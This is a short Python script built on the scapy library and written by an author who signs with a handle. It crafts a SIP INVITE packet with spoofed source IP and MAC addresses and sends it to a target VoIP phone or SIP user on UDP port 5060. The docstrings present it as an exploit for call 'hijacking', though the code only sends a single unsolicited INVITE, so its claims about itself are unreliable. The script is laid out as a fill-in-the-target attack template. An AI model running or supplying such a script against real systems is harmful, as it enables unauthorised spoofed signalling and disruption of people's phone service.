from scapy.all import *
# Written by Lithiokride

# Step 1: Define target parameters for SIP
target_ip = "192.0.2.1"          # Change this to the target SIP user's IP address |can be VoIP phones|.
target_mac = "00:11:22:33:44:66"  # Change this to the target MAC address.
source_ip = "192.0.2.2"          # Change this to the attacker's IP address.
source_mac = "00:11:22:33:44:55"  # Change this to the attacker's MAC address.

# Step 2: Create a SIP INVITE packet
def create_sip_packet():
    """
    Constructs a SIP INVITE packet for hijacking.
    
    Returns:
        bytes: The crafted SIP packet.
    """
    # SIP INVITE request line
    request_line = f"INVITE sip:target_user@{target_ip} SIP/2.0\r\n"
    request_line = request_line.encode()  # Convert to bytes

    # SIP headers
    headers = (
        f"Via: SIP/2.0/UDP {source_ip};branch=z9hG4bK-1\r\n"
        f"From: <sip:attacker_user@{source_ip}>;tag=attacker_tag\r\n"
        f"To: <sip:target_user@{target_ip}>\r\n"
        f"Contact: <sip:attacker_user@{source_ip}>\r\n"
        f"Call-ID: 1234567890@{source_ip}\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Content-Length: 0\r\n\r\n"
    ).encode()  # Convert headers to bytes

    # Combine request line and headers to form the SIP packet
    sip_packet = request_line + headers

    return sip_packet  # Return the crafted SIP packet.

# Step 3: Craft the complete packet
def craft_full_packet():
    """
    Combines all packet layers (Ethernet, IP, UDP, SIP) into one packet.
    
    Returns:
        Packet: The complete crafted packet.
    """
    sip_packet = create_sip_packet()  # Call to create the SIP packet.

    # Create Ethernet layer
    ether = Ether(src=source_mac, dst=target_mac)  # Set source and destination MAC addresses.

    # Create IP layer
    ip = IP(src=source_ip, dst=target_ip)  # Set source and destination IP addresses.

    # Create UDP layer (SIP typically uses UDP port 5060)
    udp = UDP(sport=5060, dport=5060)  # Set source and destination ports.

    # Combine all layers into one packet
    packet = ether / ip / udp / Raw(load=sip_packet)  # Assemble the packet.

    return packet  # Return the complete packet.

# Step 4: Send the crafted packet
def send_exploit_packet():
    """
    Sends the crafted SIP INVITE packet to the target server.
    """
    packet = craft_full_packet()  # Call to craft the full packet.
    sendp(packet, verbose=0)      # Send the packet silently (no output to console).

# Execute the packet sending function
send_exploit_packet()  # This sends the crafted SIP packet to the target.
print("SIP INVITE packet sent.")  # Confirmation message for successful send.
